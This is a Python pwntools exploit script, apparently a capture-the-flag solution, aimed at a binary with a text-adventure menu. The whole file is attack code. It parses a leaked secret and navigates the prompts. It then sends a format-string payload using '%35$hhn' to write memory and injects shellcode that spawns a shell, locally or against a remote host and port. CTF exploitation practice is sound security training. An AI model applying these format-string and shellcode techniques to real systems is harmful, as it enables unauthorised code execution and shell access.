#!/usr/bin/python
#__author__:TaQini

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64' # 'i386'

local_file  = './167e00a26ef44e1f888b3ede29d88e38'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '/lib/x86_64-linux-gnu/libc.so.6'

if len(sys.argv) == 1:
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    host, port = sys.argv[1].split(':')
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

# info
# elf, libc

# rop1
offset = 0
payload = 'A'*offset
payload += ''

ru('secret[0] is ')
secret = int(ru('secret[1]'),16)
log.info(hex(secret))
ru('What should your character\'s name be:\n')
sl('TaQini')
ru('So, where you will go?east or up?:\n')
sl('east')
ru('go into there(1), or leave(0)?:\n')
sl('1')
ru('\'Give me an address\'\n')
fmt = 'a'*0x55+'%35$hhn' # '%%%dc' % secret + '%hhn'
# debug('b *0x400c7e')
sl(fmt)
ru('I hear it')
shellcode = asm(shellcraft.sh())
sl(shellcode)

p.interactive()

